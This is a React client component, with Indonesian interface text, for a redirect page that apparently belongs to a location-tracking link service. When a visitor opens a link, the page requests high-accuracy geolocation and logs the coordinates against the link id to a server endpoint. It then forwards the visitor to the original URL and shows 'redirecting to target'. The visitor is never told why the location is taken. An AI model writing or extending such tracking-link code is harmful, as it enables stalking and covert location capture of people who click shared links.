'use client';

import { useEffect, useState } from 'react';

interface RedirectClientProps {
  urlAsli: string;
  linkId: string;
}

export default function RedirectClient({ urlAsli, linkId }: RedirectClientProps) {
  const [status, setStatus] = useState('Mengumpulkan lokasi...');

  useEffect(() => {
    const finish = () => {
      window.location.href = urlAsli;
    };

    if (!navigator.geolocation) {
      setStatus('Geolokasi tidak tersedia. Mengalihkan...');
      finish();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;

        try {
          await fetch('/api/log-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ linkId, latitude, longitude }),
          });
        } catch (error) {
          console.error('Log lokasi gagal:', error);
        } finally {
          finish();
        }
      },
      () => {
        setStatus('Izin lokasi ditolak. Mengalihkan...');
        finish();
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  }, [linkId, urlAsli]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-white px-4 text-slate-900">
      <div className="rounded-3xl border border-slate-200 bg-slate-50 px-6 py-10 text-center shadow-sm sm:px-10">
        <div className="mx-auto mb-6 h-16 w-16 rounded-full border border-slate-200 bg-white shadow-inner flex items-center justify-center">
          <div className="h-8 w-8 animate-spin rounded-full border-4 border-slate-300 border-t-slate-700" />
        </div>
        <h1 className="text-xl font-semibold">Mengalihkan ke target...</h1>
        <p className="mt-3 text-sm text-slate-600">{status}</p>
      </div>
    </div>
  );
}
